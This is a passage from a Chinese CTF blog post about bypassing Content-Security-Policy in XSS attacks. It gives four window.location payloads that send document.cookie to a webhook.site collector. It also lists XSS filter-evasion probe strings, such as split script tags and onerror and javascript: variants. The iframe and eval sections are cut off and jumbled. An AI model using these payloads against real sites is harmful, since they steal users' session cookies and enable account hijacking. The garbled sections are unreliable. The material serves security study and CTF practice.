&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;


详细介绍：Content-Security-Policy (CSP) - HTTP 中文开发手册 - 开发者手册 - 腾讯云开发者社区-腾讯云 (tencent.com)、Content-Security-Policy - HTTP | MDN (mozilla.org)

window.location 绕过因为当今大部分网站的跳转功能都是由前端实现的，CSP一般不影响window.location对象的跳转到新的链接。所以，可以尝试使用跳转来绕过CSP获取数据
playroad类似于：
window.location=&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;

window.location.href = &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;

window.location.assign(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);

window.location.replace(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);



Iframe标签绕过Iframe标签简介HTML 内联框架元素 (&lt;iframe&gt;) 能够将另一个 HTML 页面嵌入到当前页面中。比较特别的是，如果能将页面内中的
eval()绕过XSS绕过总结探测字典：&#x27;&quot;()&lt; &gt;&lt;script&gt; &lt;/script&gt;&lt;Script&gt; &lt;/Script&gt;&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt;Onerroronerrorjavascript:JavaScript:&lt;!-- --&gt;eval()&lt;a&gt;&lt;img&gt;&lt;iframe&gt;&lt;form&gt;src&#123;&#125;/+





文章引用
引用博主「J0k3r」的文章
原文链接：https://j0k3r.top/2019/11/19/csp-bypass/


]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-XSS</tag>
      </tags>
  </entry>
</search>
